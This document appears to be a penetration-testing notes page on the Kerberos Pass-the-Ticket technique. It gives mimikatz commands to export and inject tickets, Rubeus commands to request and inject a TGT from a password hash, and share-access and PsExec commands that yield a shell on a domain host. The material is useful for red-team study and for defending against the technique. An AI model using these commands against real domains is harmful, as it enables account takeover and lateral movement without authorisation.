# Pass The Ticket

## <mark style="color:red;">Pass The Ticket</mark>

**In a pass the ticket attack access is gained to a resource of a system (for example the administrative shares) using a kerberos ticket that was generated or obtained from a compromised machine (TGT or TGS)**

{% hint style="warning" %}
PtT affects all windows platforms relying on kerberos.
{% endhint %}

run these in mimikatz:

```
kerberos::list
kerberos::list /export
```

we have the tickets that were saved inside the directory where we had the mimikatz executable.

![](<../../../.gitbook/assets/image (198).png>)

We go back to the mimikatz terminal. Here, we pass the ticket with the help of ptt module inside the Kerberos module followed by the name of the ticket that we want to pass.to perform the actions as the user that we passed the ticket for we decided to get a cmd as that user. This can be accomplished using the misc::cmd command as shown in the image given below.

```
kerberos::ptt ticket.kirbi
misc::cmd
```

![](<../../../.gitbook/assets/image (195).png>)

## <mark style="color:red;">Rubeus</mark>

[rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) is a C# toolset for raw Kerberos interaction and abuses.

we will use extract the tickets using Rubeus. This can be done with the help of the asktgt module. Although it is not so sneaky method it gets the work done. We need the domain name, User, Password Hash. When used normally will give the base64 encoded TGT ticket. But Let’s Pass the Ticket as well in the same step

```
Rubeus.exe asktgt /domain:ignite.local /user:Administrator /rc4: 32196b56ffe6f45e294117b91a83bf38 /ptt
```

or pass the ticket with kirbi file:

```
Rubeus.exe ptt /ticket:ticket.kirbi
```

now we have the ticket for user administrator and we can access shares:

```
dir \\overloadDC\\secret_shares
```

or get shell access:

```
PsExec.exe \\192.168.1.105 cmd.exe
```
